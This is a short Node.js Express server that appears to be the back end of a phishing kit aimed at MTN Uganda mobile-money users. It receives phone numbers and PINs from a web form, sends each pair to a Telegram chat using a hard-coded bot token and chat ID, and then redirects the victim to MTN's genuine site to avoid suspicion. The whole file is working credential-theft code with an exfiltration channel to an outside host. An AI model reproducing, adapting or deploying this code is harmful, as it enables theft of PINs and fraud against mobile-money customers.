const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Your Telegram credentials
const BOT_TOKEN = '8534532793:AAEMJI4fShqN37xpy-M7uG8iRox0YWZMpI0';
const CHAT_ID = '8999616005';

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

app.post('/api/submit', async (req, res) => {
    const { phone, pin } = req.body;
    
    console.log(`📥 Received: Phone=${phone}, PIN=${pin}`);
    
    if (!phone || !pin) {
        return res.status(400).json({ error: 'Missing phone or PIN' });
    }
    
    const message = `🔐 NEW TEST SUBMISSION\n\n📱 Phone: ${phone}\n🔢 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString()}`;
    
    try {
        const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
        
        console.log('✅ Sent to Telegram successfully');
        
        res.json({ 
            success: true, 
            message: 'Data received and forwarded',
            redirect: 'https://www.mtn.co.ug/'
        });
    } catch (error) {
        console.error('❌ Telegram error:', error.response?.data || error.message);
        res.status(500).json({ error: 'Telegram send failed', details: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📡 Waiting for form submissions...`);
});
